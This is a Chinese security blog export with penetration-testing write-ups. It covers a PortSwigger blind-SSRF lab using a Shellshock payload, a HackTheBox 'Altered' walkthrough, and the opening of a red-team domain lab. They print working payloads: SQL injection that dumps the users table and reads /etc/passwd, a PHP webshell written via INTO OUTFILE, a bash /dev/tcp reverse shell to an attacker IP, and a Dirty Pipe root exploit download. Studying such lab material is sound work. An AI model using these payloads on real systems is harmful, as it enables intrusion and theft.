src="https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png"></p><p>2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。</p><p><img src="https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png"></p><p>3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p><p>4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。</p><p><img src="https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png"></p><p>5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。</p><p>6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。</p><p><img src="https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png"></p><h2 id="使用-Shellshock-利用盲SSRF"><a href="#使用-Shellshock-利用盲SSRF" class="headerlink" title="使用 Shellshock 利用盲SSRF"></a>使用 Shellshock 利用盲SSRF</h2><p>简单地识别可以触发带外 HTTP 请求的盲<a href="https://portswigger.net/web-security/ssrf">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p><h3 id="靶场地址-6"><a href="#靶场地址-6" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">web-security/ssrf/blind/lab-shellshock-exploitation</a></p><h3 id="靶场说明-6"><a href="#靶场说明-6" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p><p>为了完成实验，请使用此功能对 8080 端口范围内的内部服务器<code>192.168.0.X</code>执行<a href="https://portswigger.net/web-security/ssrf/blind">盲 SSRF</a>攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。</p><h3 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、在<a href="https://portswigger.net/burp/pro">Burp Suite Professional</a>中，从 BApp Store 安装“Collaborator Everywhere”扩展。</p><p><img src="https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png"></p><p>2、将实验室的域添加到 Burp Suite 的<a href="https://portswigger.net/burp/documentation/desktop/tools/target/scope">Scope</a>，以便 Collaborator Everywhere 将其作为目标。</p><p>浏览网站。</p><p><img src="https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png"></p><p><img src="https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png"></p><p>3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。</p><p><img src="https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png"></p><p>4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。</p><p><img src="https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png"></p><p>5、将请求发送到产品页面给 Burp Intruder。</p><p>6、使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; <span class="regexp">/usr/</span>bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure><p>7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。</p><p>单击“清除 §”，将 Referer 标头更改为<code>http://192.168.0.1:8080</code>突出显示 IP 地址的最后一个八位字节（数字<code>1</code>），单击“添加 §”。</p><p><img src="https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png"></p><p>8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p><p><img src="https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png"></p><p>9、点击“开始攻击”。</p><p>攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。<a href="https://portswigger.net/web-security/ssrf">您应该会看到由成功的盲SSRF 攻击</a>命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。</p><p><img src="https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png"></p><p>要完成实验，请输入操作系统用户的名称。</p><p><img src="https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png"></p><p>另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。<a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">点击详细阅读</a>。</p><h2 id="为-SSRF-漏洞寻找隐藏的攻击面"><a href="#为-SSRF-漏洞寻找隐藏的攻击面" class="headerlink" title="为 SSRF 漏洞寻找隐藏的攻击面"></a>为 SSRF 漏洞寻找隐藏的攻击面</h2><p>许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。</p><h3 id="请求中的部分-URL"><a href="#请求中的部分-URL" class="headerlink" title="请求中的部分 URL"></a>请求中的部分 URL</h3><p>有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。</p><h3 id="数据格式中的-URL"><a href="#数据格式中的-URL" class="headerlink" title="数据格式中的 URL"></a>数据格式中的 URL</h3><p>一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到<a href="https://portswigger.net/web-security/xxe">XXE 注入</a>的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看<a href="https://portswigger.net/web-security/xxe">XXE 注入</a>漏洞时，我们将更详细地介绍这一点。</p><h3 id="通过Referer头的SSRF"><a href="#通过Referer头的SSRF" class="headerlink" title="通过Referer头的SSRF"></a>通过Referer头的SSRF</h3><p>一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅<a href="https://portswigger.net/web-security/ssrf/blind">盲 SSRF 漏洞</a>。</p><hr><blockquote><p>参考链接：</p><p><a href="https://portswigger.net/web-security/ssrf">Web Security Academy-SSRF</a></p><p><a href="https://www.ddosi.org/ssrf-lab/">portswigger ssrf lab 服务器端请求伪造靶场</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">Web安全学习笔记-4.4 SSRF</a></p><p><a href="https://www.freebuf.com/vuls/321535.html">关于SSRF和多种绕过方式</a></p><p><a href="https://www.cnblogs.com/kaituorensheng/p/3776527.html">URL中“#” “？” &amp;“”号的作用</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Altered</title>
      <link href="/2022/04/08/HackTheBox-Altered/"/>
      <url>/2022/04/08/HackTheBox-Altered/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png"></p><h2 id="寻找立足点"><a href="#寻找立足点" class="headerlink" title="寻找立足点"></a>寻找立足点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sS -sCV -T<span class="number">4</span> <span class="number">10.10.11.159</span> -o ports.nmap</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png"></p><h3 id="登陆界面攻击面测试"><a href="#登陆界面攻击面测试" class="headerlink" title="登陆界面攻击面测试"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p><p><img src="https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png"></p><p>发现当输入账号为<code>test</code>时返回用<code>无效用户名</code>，当输入用户名为<code>admin</code>时返回<code>密码无效</code>，存在用户名枚举</p><p><img src="https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png"></p><p><img src="https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png"></p><p>还有一个<code>忘记密码</code>的功能，试试能不能修改<code>admin</code>的密码，发现需要填写验证码。</p><p>接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。</p><p><img src="https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png"></p><h3 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h3><p>接下来尝试抓包对验证码进行爆破</p><p><img src="https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png"></p><p>标记要爆破的参数</p><p><img src="https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png"></p><p>设置payload</p><p><img src="https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png"></p><p>爆破了一会后，状态码就从<code>200</code>变成了<code>429</code>，应该是出现错误了</p><p><img src="https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png"></p><p>提示了错误信息，可能是爆破请求频繁导致被禁止访问了</p><p><img src="https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png"></p><p><img src="https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png"></p><h3 id="请求次数限制绕过"><a href="#请求次数限制绕过" class="headerlink" title="请求次数限制绕过"></a>请求次数限制绕过</h3><p>按照<a href="https://www.securecyberfuture.com/post/bypass-rate-limit">Bypass Rate Limit</a>的方法尝试绕过访问限制，添加<code>X-Forwarded-For</code>字段，返回状态码<code>200</code></p><p><img src="https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png"></p><p>再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破</p><p><img src="https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png"></p><p><img src="https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png"></p><p><img src="https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png"></p><p>等待了几分钟后，成功爆破出了验证码</p><p><img src="https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png"></p><p>使用验证码修改了<code>admin</code>的密码后登录，跳转到了用户列表</p><p><img src="https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png"></p><p>点击用户栏的<code>View</code>会在上方显示出用户的信息</p><p><img src="https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png"></p><h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>抓包查看一下</p><p><img src="https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png"></p><p>将请求方式更改为POST，看一下会返回什么。提示不支持POST</p><p><img src="https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png"></p><p>然后试试用POST的请求方式，但将POST改为GET。返回了一些<code>JSON</code>格式的信息</p><p><img src="https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png"></p><p>那我们也将请求内容改为<code>JSON</code>格式试试。如下，返回正常了</p><p><img src="https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png"></p><p>上面的<code>cookie</code>可以看到有<code>laravel_session</code>的字段，这个站点是使用的<code>Laravel</code>框架，而<code>Laravel</code>是一款<code>PHP</code>Web开发框架</p><p>参考文章<a href="https://www.freebuf.com/articles/web/323834.html">PHP弱类型</a>，将<code>secret</code>的值改为<code>bool</code>类型的<code>true</code>，任意的<code>id</code>的值都能返回正常</p><p><img src="https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png"></p><p><img src="https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png"></p><h3 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h3><p>接着对<code>id</code>进行测试，发现添加一个<code>单引号</code>，返回<code>服务器错误</code>，很明显的<code>SQL注入</code>的特征</p><p><img src="https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png"></p><p>接下来试<code>SQL注入</code>，先通过<code>order by</code>判断字段数，当为<code>3</code>时返回正常，<code>4</code>时返回错误，因此字段数为<code>3</code></p><p><img src="https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png"></p><p><img src="https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png"></p><p>接下来通过<code>union select</code>查看回显的位置</p><p><img src="https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png"></p><p>将<code>3</code>的位置替换为SQL语句可以成功执行</p><p><img src="https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png"></p><p>先爆出所有数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png"></p><p>爆出所有表名和列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,group_concat(&#x27;\n&#x27;,table_name,&#x27;:&#x27;,column_name) from information_schema.columns where table_schema=&#x27;uhc&#x27;-- -</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png"></p><p>爆出<code>users</code>表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="string">&#x27;\n&#x27;</span>,name,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> uhc.users<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png"></p><p>但是我们已经有<code>admin</code>的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了<code>/etc/passwd</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2 union select 1,2,load_file(&#x27;/etc/passwd&#x27;)-- -</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png"></p><p>接下来的思路是通过<code>SQL注入</code>往站点写<code>shell</code>，来获得服务器权限，但是先要知道站点的真实路径</p><h3 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h3><p>在最开始的端口扫描中可以看到，该站点使用了<code>Nginx</code>作为中间件，我们可以读取<code>Nginx</code>的站点配置文件，来查看配置的站点根目录。尝试读取<code>Nginx</code>的站点配置文件的默认路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;/etc/nginx/sites-enabled/default&#x27;</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png"></p><p>如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写<code>shell</code>，来得到服务器的初步控制权</p><p>通过<code>into outfile</code>向网站根目录写入<code>0.php</code>，返回<code>服务器错误</code>，但是不影响</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?=`$_GET[1]`?&gt;&#x27;</span> <span class="keyword">into</span> outfile<span class="string">&#x27;/srv/altered/public/0.php&#x27;</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png"></p><p>访问我们的<code>shell</code>，能成功执行系统命令</p><p><img src="https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="number">10.10.16.6</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png"></p><p><img src="https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png"></p><p>本地开启的监听接收到了反弹<code>shell</code></p><p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl+z</span><br><span class="line">stty raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png"></p><h3 id="Dirty-Pipe提权漏洞"><a href="#Dirty-Pipe提权漏洞" class="headerlink" title="Dirty Pipe提权漏洞"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p><p><img src="https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png"></p><p>前段时间刚爆出了一个Linux的提权漏洞<code>Dirty Pipe</code>，看了一下<a href="https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability">The Dirty Pipe Vulnerability</a>的影响范围：</p><ul><li>version &gt; 5.8</li><li>version &lt; 5.16.11、5.15.25、5.10.102</li></ul><p><img src="https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png"></p><p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p><p>现在攻击机下载<a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p><p><img src="https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/AlexisAhmed/</span>CVE-<span class="number">2022</span>-<span class="number">0847</span>-DirtyPipe-Exploits<span class="regexp">/main/</span>exploit-<span class="number">2</span>.c</span><br><span class="line"></span><br><span class="line">gcc exploit-<span class="number">2</span>.c -o exp -fPIC -static </span><br></pre></td></tr></table></figure><p>在攻击机用<code>python</code>起一个简易的服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png"></p><p>在靶机下载，并赋予执行权限</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">10.10</span>.<span class="number">16.6</span>/<span class="keyword">exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> ./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure><p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p><p><img src="https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png"></p><p><img src="https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透攻击红队域渗透靶场-2(redteam.lab)Writeup</title>
      <link href="/2021/12/25/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-2-redteam-lab-Writeup/"/>
      <url>/2021/12/25/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-2-redteam-lab-Writeup/</url>
      
        <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：log4j2 RCE、CVE<span class="string">-2021</span><span class="string">-42287</span>、CVE<span class="string">-2021</span><span class="string">-42278</span>、MS17<span class="string">-010</span>漏洞利用、frp内网穿透、MSF搭建socks代理</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p><p><img src="https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png"></p><p>PS：靶场下载地址关注微信公众号：<strong>红队攻防实验室</strong> 回复：<strong>001</strong> 即可获取到下载地址。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ubuntu</span> Desktop <span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">124</span>.<span class="number">8</span>（模拟服务器公网<span class="built_in">ip</span>）</span><br><span class="line"><span class="symbol">Kali</span> <span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">124</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.124.8</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png"></p><p>一台Ubuntu机器，开放了两个端口<code>22</code>、<code>38080</code></p><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><code>22</code>端口暂时无法利用，先访问<code>38080</code>端口</p><p><img src="https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png"></p><p>是一个web服务，直接尝试最近爆出的<code>CVE-2021-44228</code>Log4j2 rce漏洞，看看能不能获取到 <code>dnslog</code></p><p><img src="https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png"></p><p>发现存在<code>CVE-2021-44228</code>log4j2 rce漏洞。接下来利用该漏洞反弹shell</p><h2 id="CVE-2021-44228漏洞利用"><a href="#CVE-2021-44228漏洞利用" class="headerlink" title="CVE-2021-44228漏洞利用"></a>CVE-2021-44228漏洞利用</h2><p>使用<a href="https://github.com/feihong-cs/JNDIExploit">工具</a>在<strong>Kali</strong>终端（192.168.124.7）开启一个LDAP：</p><p><img src="https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png"></p><p>并开启一个监听端口，来接收反弹的shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnvp <span class="number">4444</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png"></p><p>使用EXP成功反弹shell</p><p><img src="https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png"></p><p>当前的shell是一个Docker环境</p><p><img src="https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png"></p><p><img src="https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png"></p><p>在<code>/root/    </code>目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的<code>SSH</code>的账号密码</p><p><img src="https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>使用获得的账号密码成功登录<code>SSH</code>服务</p><p><img src="https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png"></p><p><code>ifconfig</code>发现该机器有双网卡，其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡</p><p><img src="https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png"></p><p>我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">for</span> i in <span class="number">10</span>.<span class="number">0</span>.<span class="number">1</span>.&#123;<span class="number">1</span>..<span class="number">254</span>&#125;; do if ping -c <span class="number">3</span> -w <span class="number">3</span> $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure><p>发现有一台存活主机<code>10.0.1.7</code></p><p><img src="https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png"></p><h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><h3 id="frp流量转发"><a href="#frp流量转发" class="headerlink" title="frp流量转发"></a>frp流量转发</h3><p>使用<a href="https://github.com/fatedier/frp"><strong>frp</strong></a>将已获取到权限的<code>Ubuntu</code>的流量代理出来，这样就可以通过<code>Kali</code>来对内网存活主机进行渗透了</p><p>我们先要将<code>frp</code>上传到<code>Ubuntu</code>中，在<code>Kali</code>开启一个<code>HTTP</code>服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png"></p><p>然后在<code>Ubuntu</code>中下载</p><p><img src="https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png"></p><p>在<code>Ubuntu</code>中给予<code>frp.tar.gz</code>执行权限，并解压</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frp<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">tar -zxvf frp<span class="selector-class">.tar</span>.gz</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png"></p><p>进入<code>frp</code>目录，配置好<code>frpc.ini</code></p><p><img src="https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png"></p><p>然后回到<code>Kali</code>终端开启<code>frp</code>的服务端</p><p><img src="https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png"></p><p>再在<code>Ubuntu</code>中启动客户端</p><p><img src="https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png"></p><p>此时<code>Kali</code>的服务端就有响应了</p><p><img 